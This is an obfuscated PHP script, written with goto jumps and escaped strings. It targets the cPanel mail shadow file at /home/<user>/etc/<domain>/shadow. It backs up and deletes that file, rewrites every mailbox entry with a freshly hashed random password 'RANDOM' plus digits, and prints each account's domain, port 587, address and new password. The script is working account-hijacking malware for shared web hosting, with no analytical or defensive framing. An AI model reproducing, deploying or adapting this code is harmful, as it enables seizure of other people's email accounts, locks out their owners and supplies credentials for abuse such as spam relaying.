<?php
goto d61e3; d61e3: set_time_limit(0); goto A8e2e; b83ba: $t = $_SERVER["\x53\105\122\x56\105\122\x5f\116\101\x4d\105"]; goto Bb086; Db5b0: @link("\57\x68\x6f\x6d\145\x2f" . $user . "\x2f\145\x74\x63\x2f" . $t . "\57\163\150\x61\144\x6f\x77", "\57\x68\157\x6d\x65\57" . $user . "\57\145\164\143\57" . $t . "\57\x73\x68\141\x64\x6f\167\x2e\x31\63\x34\56\x62\141\x6b"); goto B6e65; B6e65: @unlink("\x2f\150\157\x6d\145\57" . $user . "\x2f\145\x74\143\x2f" . $t . "\57\x73\x68\141\x64\x6f\x77"); goto b553c; E5c2f: $pwd = crypt($password, "\44\66\x24\x52\x41\x4e\x44\117\x4d\x24"); goto b83ba; Bb086: $t = @str_replace("\x77\x77\167\x2e", '', $t); goto ac650; b28d5: $user = get_current_user(); goto D3031; ac650: @($passwd = file_get_contents("\57\x68\157\155\145\x2f" . $user . "\57\145\x74\x63\x2f" . $t . "\57\x73\x68\x61\144\157\167")); goto B0ca7; D3031: $rand = rand(1000000, 9000000); goto Ec044; A8e2e: ini_set("\x6d\141\170\x5f\x65\x78\x65\143\165\x74\x69\x6f\x6e\137\x74\x69\x6d\x65", 0); goto f451c; B0ca7: $ex = explode("\15\xa", $passwd); goto Db5b0; Ec044: $password = "\x52\101\116\x44\x4f\115" . $rand . ''; goto E5c2f; f451c: ini_set("\x6d\x65\x6d\x6f\162\171\x5f\x6c\151\155\151\x74", -1); goto b28d5; b553c: foreach ($ex as $ex) { goto a2de8; Cfb32: F8256: goto d82a8; B2b42: if (!$e) { goto Ef642; } goto cbab0; Efe8a: "\74\x2f\x63\145\x6e\164\x65\x72\76"; goto a24cd; cbab0: $b = fopen("\57\150\157\x6d\x65\x2f" . $user . "\x2f\x65\x74\x63\57" . $t . "\x2f\163\x68\141\x64\157\x77", "\141\142"); goto ddae4; bb488: echo "\x3c\x73\x70\141\x6e\x20\163\164\x79\154\x65\75\47\x63\x6f\154\157\162\72\43\x30\x30\x66\x66\x30\60\x3b\x27\x3e" . $t . "\x7c\x35\x38\67\x7c" . $e . "\100" . $t . "\x7c" . $password . "\74\57\163\160\x61\x6e\x3e\x3c\142\162\76"; goto Efe8a; ddae4: fwrite($b, $e . "\x3a" . $pwd . "\72\61\66\62\x34\x39\x3a\x3a\72\72\72" . "\15\12"); goto A591a; a2de8: $ex = explode("\72", $ex); goto e52dd; a24cd: Ef642: goto Cfb32; e52dd: $e = $ex[0]; goto B2b42; A591a: fclose($b); goto bb488; d82a8: } goto Ae54f; Ae54f: a685e:
